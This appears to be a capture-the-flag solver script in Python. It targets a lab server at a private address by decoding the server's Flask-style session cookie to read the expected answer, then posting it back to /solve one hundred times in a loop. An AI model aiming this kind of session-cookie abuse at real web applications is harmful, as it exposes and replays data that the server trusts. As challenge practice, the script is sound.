import requests
import base64
import json


class Solver(object):
    def __init__(self) -> None:
        self.URL = "http://10.45.1.2:8000/"
        self.s = requests.Session()
    
    
    def solve(self) -> str:
        # get the cookie
        self.s.get(self.URL)
        
        header = {
            "Content-Type": "application/json"
        }
        
        for _ in range(100):
            cookie : str = self.s.cookies.get("session")
            print(_, cookie)
            cookie = cookie.split(".")[0]
            cookie = cookie + ("=" * (len(cookie) % 4))
            cookie = base64.b64decode(cookie).decode()
            
            r = self.s.post(f'{self.URL}/solve', data=cookie, headers=header, allow_redirects=True)
            print(r.text)
        
        r = self.s.get(f'{self.URL}/save_session')
        print(r.text)


if __name__ == '__main__':
    s = Solver()
    s.solve()